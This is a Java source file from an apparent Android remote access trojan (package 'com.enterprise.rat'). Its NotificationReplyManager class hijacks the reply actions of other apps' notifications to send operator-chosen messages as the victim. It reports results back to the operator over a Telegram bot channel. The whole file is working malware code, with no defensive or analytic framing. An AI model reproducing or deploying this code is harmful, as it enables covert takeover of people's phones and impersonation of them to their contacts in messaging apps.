package com.enterprise.rat.commands;

import android.app.Notification;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.service.notification.StatusBarNotification;
import com.enterprise.rat.services.NotificationService;
import com.enterprise.rat.utils.TelegramApi;

public class NotificationReplyManager {
    private Context context;
    public NotificationReplyManager(Context context) { this.context = context; }
    public void replyToNotification(String pkg, String replyText) {
        NotificationService svc = NotificationService.getInstance();
        if (svc == null) { TelegramApi.sendMessage("❌ Service inactive"); return; }
        for (StatusBarNotification sbn : svc.getActiveNotifications()) {
            if (sbn.getPackageName().equals(pkg) && sbn.getNotification().actions != null) {
                for (Notification.Action action : sbn.getNotification().actions) {
                    if (action.getRemoteInputs() != null && action.getRemoteInputs().length > 0) {
                        Intent intent = new Intent();
                        Bundle bundle = new Bundle();
                        bundle.putCharSequence(action.getRemoteInputs()[0].getResultKey(), replyText);
                        intent.putExtra("android.remoteinput.resultsData", bundle);
                        try { action.actionIntent.send(context, 0, intent); TelegramApi.sendMessage("✅ Reply sent to " + pkg); return; } catch (Exception e) {}
                    }
                }
            }
        }
        TelegramApi.sendMessage("❌ No replyable notification found.");
    }
}
